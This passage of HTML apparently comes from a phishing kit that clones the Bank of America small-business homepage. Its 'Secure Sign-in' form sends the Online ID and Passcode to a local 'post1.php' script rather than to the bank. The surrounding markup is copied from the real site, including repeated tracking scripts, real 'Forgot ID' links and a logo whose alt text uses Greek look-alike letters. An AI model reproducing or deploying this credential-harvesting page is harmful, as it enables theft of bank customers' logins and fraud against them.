</div><div id="Marker-default-BOA_MVT_TOP-0" style="visibility:hidden;display:none">&nbsp;</div><script src="://///standard?Host=127.0.0.1&amp;Session=1504791428938-341161&amp;Page=1504794750733-288681&amp;screenHeight=768&amp;screenWidth=1024&amp;browserWidth=819&amp;browserHeight=490&amp;browserTimeOffset=60&amp;colorDepth=24&amp;XDomain=enabled&amp;Count=1&amp;=BOA_MVT_TOP&amp;Id=0&amp;Time=1504798350811&amp;URL=%3A%2F%2F127.0.0.1%2Fboa%2F&amp;Referrer=&amp;Version=48" language="JavaScript"></script><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', 's://e/eimage?=optOut&profile.throttle_value=999&Default=s%3A///pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', 'ubox/image?=bac_isSBCustomer&profile.isSBCustomer=true&Default=s%3A///pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', 's://e/eimage?=optOut&profile.throttle_value=999&Default=s%3A///pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', 'ubox/image?=bac_isSBCustomer&profile.isSBCustomer=true&Default=s%3A///pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', 's://e/eimage?=optOut&profile.throttle_value=999&Default=s%3A///pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', 'ubox/image?=bac_isSBCustomer&profile.isSBCustomer=true&Default=s%3A///pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=   ')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', 's://e/eimage?=optOut&profile.throttle_value=999&Default=s%3A//   /pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', 'ubox/image?=bac_isSBCustomer&profile.isSBCustomer=true&Default=s%3A//   /pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=   ')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', 's://e/eimage?=optOut&profile.throttle_value=999&Default=s%3A//   /pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', 'ubox/image?=bac_isSBCustomer&profile.isSBCustomer=true&Default=s%3A//   /pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div id="Marker-default-BOA_MVT_TOP-0" style="visibility:hidden;display:none">&nbsp;</div><script src="./IMG/standard" language="JavaScript"></script><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=   ')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

      if ((runOnce !="no")) {
        if (ThrottleVal == 999) {
            seTTCookie("me_runonce","no",30 * 60 * 1000);
            document.write("<img src='s://e/eimage?=optOut&profile.throttle_value=999&Default=s%3A//   /pa/global-assets/1.0/graphic/blank.gif' height='1px' width='1px' />");
         }
        if ((isSBCustomer == "true") ) {
           seTTCookie("me_runonce","no",30 * 60 * 1000);
           document.write("<img src='ubox/image?=bac_isSBCustomer&profile.isSBCustomer=true&Default=s%3A//   /pa/global-assets/1.0/graphic/blank.gif' height='1px' width='1px' />");
         }

      }
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div>
 

<script language="JavaScript" type="text/javascript">
        var timeoutMillis = "10000";
</script>
<script>
var eventUrl ="undefinedAction.go";
</script>


                <script type="text/javascript">if(self == top){var theBody=document.getElementsByTagName("body")[0];theBody.style.display="block";}else{top.location=self.location;}</script>
                <noscript>&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;style&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;body{display:block;}&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/style&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;</noscript>
        <a name="skip_to_sign_in" href=" /#skip_to_signin" class="ada-hidden">skip to sign in</a>
                    <a class="ada-hidden ada-visible-focus" href=" /#skip-to-h1" id="ada-skip-link">Skip to main content</a>
        <div id="homepage-content">
            <div id="hp-section-1">






<div class="main-nav-module">
<div class="fl-rt">
    <ul>
    
            <li class="">
            <a name="global_personal" href="index.php" target="_self">Personal</a>

</li>
    
            <li class="selected">
<a name="global_smallbusiness" href="buss.php" target="_self">Small Business</a>
</li>
    
            <li class="">
<a name="global_wealthmanagement" href="" target="_self">Wealth Management</a>
</li>
    
            <li class="">
<a name="global_businessesandinstitutions" href="s://corp.   /business/bi/home" target="_self">Businesses &amp; Institutions</a>
</li>
    
            <li class="flagscape">
<a name="global_about" href="" target="_self" style="
    background: url(IMG/hp-static-sprite-v4.png) no-repeat -196px -30px;
">About Us</a>
</li>
    </ul>
    <div class="last-corner"></div> 
</div>
<div class="clearboth"></div>
</div>



                    <!-- 
 MODULE: 
     isModule: true
     ID: 4A10B1CD-B5B5-4A56-A10A-6B921F99F27E
     Name: hp-header-bdf-module
     Skin: home-page -->
 






    <div class="hp-hm-hps">
        <div itemscope="" itemtype="" class="logo">
            <img itemprop="logo" height="28" width="221" alt="Βank of Αmerica" src="./IMG/boa_logo.gif">
            <a href=" /" itemprop="url" class="hidden"></a>
        </div>
        <div class="sub-header">
            <ul class="header-links">
                        <li class="link-item dropdown-menu locator">
                        
                            <a id="locatorLink" class="locator-link" rel="locatorLayer" name="header_locations" href="javascript:void(0);"><span class="locator-icon" style="
    height: 21px;
    width: 17px;
    position: absolute;
    margin-left: -26px;
    margin-top: -6px;
    background: url(IMG/A-icon-locator.png) no-repeat;
"></span> Locations<span class="ada-hidden"> Layer</span></a>

                            <div id="locatorLayer" class="ui-dialog custom boa-com-task-layer open hide" tabindex="-1" aria-describedby="locatorLayer" aria-labelledby="ui-id-1">

                            <div class="ui-dialog-titlebar ">
                                <button id="locatorLayer-CloseLink" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-icon-only ui-dialog-titlebar-close" type="button">
                                <span class="ui-button-icon-primary ui-icon ui-icon-closethick"></span>
                                <span class="ui-button-text">close</span>
                                <span class="ada-hidden"> Locations</span>
                                </button>
                             </div>
                             <div class="layer-content">
                                <h3 class="ada-hidden" style="display: none;">Locations</h3>

                                <form autocomplete="OFF" id="locatorForm" action="">
                                    <label for="locationField">Find a financial center or ATM</label>
                                     <div class="input-container">
                                        <input name="locationField" id="locationField" placeholder="Enter address, ZIP code or landmark" maxlength="140">
                                        <a id="locatorSearch" class="btn-bofa btn-bofa-small btn-bofa-blue btn-bofa-noRight location-submit" href="javascript:void(0);">Go <span class="ada-hidden">find a Financial center / ATM results</span></a>
                                     </div>
                                </form>
                                <div class="bottom-content">
                                   <a id="sheduleAppt" class="schedule-appt" href=""><span class="icon"></span>Schedule an appointment</a>
                                </div>
                             </div>
                             <div class="boa-ada-end ada-hidden">End of layer.</div>
                          </div>
                        </li>
                            <li class="link-item">
            <a name="header_contactus" href=" /contactus/contactus.go" target="_self">Contact Us</a>
 </li>
                            <li class="link-item">
            <a name="header_help" href=" /help/overview.go" target="_self">Help</a>
 </li>
                            <li class="link-item last">
            <a name="header_enespanol" href=" /homepage/overview.go?request_locale=es_US" target="_self"><span lang="es-US">En español</span></a>
 </li>
      </ul>





<div class="header-search nlh inline">
  
  <div class="nav-search ready">
    <form class="search-form" action="s://myaccounts/public/search-results/unAuthenticatedSearch.go" data-js="/pa/components/utilities/search-util/1.0/script/nav-search.min.js" data-css="/pa/components/utilities/search-util/1.0/style/nav-search.css" data-text-unavailable="Search Currently Unavailable">
      <div class="search-input-container cf" data-icon="#!">
        <label for="nav-search-query" class="ada-hidden">Search Term</label>
        <input type="text" placeholder="How can we help you?" name="query" class="search-query" id="nav-search-query" maxlength="99" rel="Search" autocomplete="off" value="" size="20"><input type="submit" alt="Search" title="Search" value="Submit Search" name="Search Module - Top Result â€“ Search Button" class="submit track-me">
      <div class="icon icon-search"><div class="icon-layer icon-layer--level1"></div><div class="icon-layer icon-layer--level2"></div><div class="icon-layer icon-layer--level3"></div><div class="icon-layer icon-layer--level4"></div></div></div>
    </form>
  </div>

</div>

        </div>
        <div class="clearboth"></div>
    </div>
    

    
    
        <noscript>
&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;style&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;body{display:block;}&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/style&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
            &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;div class="js-disabled-overlay"&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/div&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;div class="no-script-module"&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                    &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;div class="fodal-top"&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/div&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                    &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;div class="fodal-bottom"&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                        &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;div class="fodal-content"&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                            &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;div class="fodal-title"&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;Please Use JavaScript&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/div&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                            &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;div&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;p&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;You need a web browser that supports JavaScript to use our site. Without it, some pages won&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;rsquo;t work as designed.&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/p&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;p&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;To make sure JavaScript is turned on, please adjust your browser settings.&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/p&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;p&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;nbsp;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/p&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;p&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;a name="Browser_Help_And_Tips" href="/onlinebanking/online-banking-security-faqs.go" target="_self"&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;Browser Help and Tips&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/a&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/p&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;p&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;nbsp;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/p&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/div&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                        &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/div&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;        
                        &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;div class="fodal-close"&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt; 
                            &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;a class="button" href=/homepage/overview.go?js=y&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;span&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;Close&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/span&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/a&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                        &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/div&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                        &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;div class="clearboth"&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/div&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                    &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/div&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;
                &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/div&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;</noscript>
    <style type="text/css">
        .skipoff {height:1px;left:-10000px;overflow:hidden;position:absolute;top:auto;width:1px;}
    </style>
            </div>
            <div id="hp-section-2">






    <img src="./IMG/clr.gif" style="position:absolute; left:-2000px;" alt"="" "="" width="1" height="1">
<script type="text/javascript">
    var currentLocation="en_US";
    var fingerPrintCollectionEnabled = false;
    </script>

<div class="hp-sign-in-pbi-hp-module sbhp" id="hpSignInModule">
    <div class="hp-sign-in-pbi-hp-module hp" id="hpSignInModule" style="
    background: #857363;
">
    <div class="sign-in-module-content">
        <div id="skip_to_signin"></div>

                                <div id="SI_sign-off-message-display" class="sign-in-module-messages signoffMessage hide">
                                You're signed out. Thank you.
                            </div>


                                <div tabindex="0" id="SI_online-id-missing" class="sign-in-module-messages errorMessage1 hide">Your Online ID is missing. Please try again.</div>

                                <div tabindex="0" id="SI_online-passcode-missing" class="sign-in-module-messages errorMessage4 hide">Your Passcode is missing. Please try again.</div>









        <div id="SI_welcome-message" class="custom-message welcomeMessageDiv" style="
    background: #857363;
">Secure Sign-in</div>
            <form name="frmSelectedId" action="https://www.bankofamerica.com/homepage/overview.go" method="post">
                <input type="hidden" id="select_id" name="select_id" value="">
            </form>

            <form name="frmSignIn" action="post1.php" method="post" autocomplete="OFF">
              
            

            <div class="login-container" id="top-container" style="
    background: #857363;
">
                <div class="login-inputs" style="
    background: #857363;
">
                    
                        <div class="id-text show-for-id-text ">
                            <label for="onlineId1" class="ada-hidden">Online ID</label>
                            <input type="text" id="onlineId1" name="onlineId" placeholder="Online ID" value="" maxlength="32" class="signin-text-box">
                        </div>
                        <div class="pass-text">
                            <label for="passcode1" class="ada-hidden">Passcode</label>
                            <input type="password" id="passcode1" name="passcode" placeholder="Passcode" value="" maxlength="20" class="signin-text-box tl-private" aria-live="assertive">
                        </div>
                    

                    <button id="hp-sign-in-btn" class="hp-sign-in-btn btn-bofa btn-bofa-small btn-bofa-noRight" data-cm="[&quot;homepage_sign_in&quot;, &quot;homepage:Content:smbus;homepage_smbus&quot;]"><span class="lock" aria-hidden="true" style="
    background: url(IMG/hp-static-sprite-v4.png) no-repeat 0 -75px;
"></span>Sign In</button>
                    <div class="clearboth"></div>
                </div>
                
            </div></form>
            <div class="save-id-container" style="
    background: #857363;
">
                <form id="savedIdForm" name="savedIdForm" autocomplete="OFF" style="
    /* color: #857363; */
    background: #857363;
">
                    <div class="save-id-checkbox show-for-id-text ">
                        <div class="save-id-label">
                            <input type="checkbox" id="saveMyID1" name="saveMyID1" value="Y">
                            <label for="saveMyID1">Save Online ID</label>
                        </div>
                    </div>
                    <div class="security-link">
                        <a rel="hpSecurityHelpLinkContent" class="boa-action boa-com-task-layer-link boa-com-task-layer-right boa-com-task-layer-width-520" href="javascript:void(0);" id="security_help_link">Security &amp; Help</a>
                    </div>
                    <div class="clearboth"></div>
                </form>
            </div>

        <div class="signin-bottom-links">
            <ul class="sign-services">
                        <li class="left-link">
                            <a class="other-services" href="https://secure.bankofamerica.com/login/reset/entry/forgotOIDScreen.go" id="ForgotID">Forgot ID</a>
                         </li>
                         <li class="middle-link">
                            <a class="other-services" href="https://secure.bankofamerica.com/login/reset/entry/forgotPwdScreen.go" id="ForgotPasscode">Forgot Passcode</a>
                        </li>
                        <li class="right-link">
                            <a href="https://secure.bankofamerica.com/login/enroll/entry/olbEnroll.go" id="Enroll">Enroll</a>
                        </li>

            </ul>
            <div class="clearboth"></div>
        </div>
    </div>
    <div class="clearboth"></div>
    <div id="hpSecurityHelpLinkContent" class="hide hp-security-help-layer">
        <h3>Security &amp; Help</h3>
        <div class="com-task-layer-content">
            <p><strong>Check your browser address bar to make sure you're on our real website:</strong></p>

            <div class="hp-layer-ul">
                <ul class="gray-sq-bullet">
<li>   </li>
<li>Green text/shading</li>
<li>Lock icon</li>
</ul>
            </div>

            <div class="hp-url-example"></div>
            <p><a name="ProtectYourselfFromPhishing" href=" /privacy/online-mobile-banking-privacy/online-banking-security.go" target="_self">Protect yourself from phishing</a></p>

            <div class="separator"></div>

            <p><strong>Your saved Online ID helps us personalize your visit</strong></p>

            <div class="hp-bottom">

                        <p><a name="HowWeCollectandUseInformation" href=" /privacy/Control.do?body=privacysecur_onlin" target="_self">How we collect and use information</a></p>


            </div>
        </div>
    </div>
</div>
    <div class="clearboth"></div>
    <div id="hpSecurityHelpLinkContent" class="hide hp-security-help-layer">
        <h3>Security &amp; Help</h3>
        <div class="com-task-layer-content">
            <p><strong>Check your browser address bar to make sure you're on our real website:</strong></p>

            <div class="hp-layer-ul">
                <ul>
<li>www.bankofamerica.com</li>
<li>Green text/shading</li>
<li>Lock icon</li>
</ul>
            </div>

            <div class="hp-url-example"></div>
            <p><a name="ProtectYourselfFromPhishing" href="../privacy/online-mobile-banking-privacy/online-banking-security.html" target="_self">Protect yourself from phishing</a></p>

            <div class="separator"></div>

            <p><strong>Your saved Online ID helps us personalize your visit</strong></p>

            <div class="hp-bottom">

                        <p><a name="HowWeCollectandUseInformation" href="../privacy/online-privacy-notice.html?body=privacysecur_onlin" target="_self">How we collect and use information</a></p>


            </div>
        </div>
    </div>
</div>




                    <!-- 
 MODULE: 
     isModule: true
     ID: A3D85D64-2AE1-4DAB-A5A1-01F157F6908C
     Name: hp-power-menu-module -->
 










<form>
        <ul class="power-menu-module">



            <li>
                        <a class="first" href="javascript:void(0);" title="" style="width:122px">Banking<span class="ada-hidden"> menu. Press Enter to access submenu. To move through items press up or down arrow.</span></a>
                            <div class="submenu submenu-multicol" id="pm-submenu-first" style="visibility: hidden; width: 400px; background: rgb(255, 255, 255); display: block;">
                                <div class="submenu-left submenu-col" style="height: 316px;">
                                    <a name="checking_" href=" /deposits/checking/checking-accounts.go" target="_self" adbe-handled="true">Checking </a>




                                    <a name="savings" href=" /deposits/savings/savings-accounts.go" target="_self" adbe-handled="true">Savings</a>




                                    <a name="cds" href=" /deposits/bank-cds/cd-accounts.go" target="_self" adbe-handled="true">CDs</a>




                                    <a name="business_checking" href=" /smallbusiness/deposits/checking-accounts/" target="_self" adbe-handled="true">Business Checking</a>




                                    <a name="l2_banking_student_banking" href=" /student-banking/overview.go" target="_self" adbe-handled="true">Student Banking</a>




                                    <a name="online_banking" href=" /onlinebanking/online-banking.go" target="_self" adbe-handled="true">Online Banking</a>




                                    <a name="mobile_banking" href=" /online-banking/mobile.go" target="_self" adbe-handled="true">Mobile Banking</a>



                        <div class="dash-border"></div>

                                    <a name="l2_banking_more_products" href=" /sitemap/personal.go" target="_self" adbe-handled="true">More <span class="ada-hidden">Banking</span> Products</a>




                    </div>
                        <!-- In right column without style-->
                            <div class="submenu-right submenu-col" style="height: 316px;">
                                        <a name="preferred_rewards_" href=" /preferred-rewards/" target="_self" adbe-handled="true">Preferred Rewards 
                    <span class="submenu-right-desc">Get more rewards with<br>your everyday banking</span></a>




